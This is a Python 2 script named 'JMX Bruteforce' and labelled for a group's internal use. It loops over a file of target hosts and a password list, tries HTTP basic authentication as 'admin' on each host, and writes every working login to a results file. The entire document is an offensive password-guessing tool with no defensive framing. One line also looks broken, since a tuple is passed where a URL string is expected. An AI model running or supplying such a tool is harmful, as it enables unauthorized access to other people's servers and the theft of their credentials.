"""
JMX Bruteforce for Python2
Code by tw!XX for FXP-TERMiNAL.iNFO iNTERNAL USE
"""
import urllib2

def bruteforce():
    hosts = open('log_jmx_secured.txt','r').read().splitlines()
    passwords = open('password.txt','r').read().splitlines()
    for host in hosts:
        for password in passwords:
            try:
                url = host.partition(' ')
                manager = urllib2.HTTPPasswordMgrWithDefaultRealm()
                manager.add_password(None, url, 'admin', password)
                handler = urllib2.HTTPBasicAuthHandler(manager)
                opener = urllib2.build_opener(handler)
                urllib2.install_opener(opener)
                urllib2.urlopen(url)
            except:
                pass
            else:
                results = open('bruted_jmx.txt','a')
                results.write(url+" Login: admin/"+password+"\n")
                results.close()
                break
bruteforce()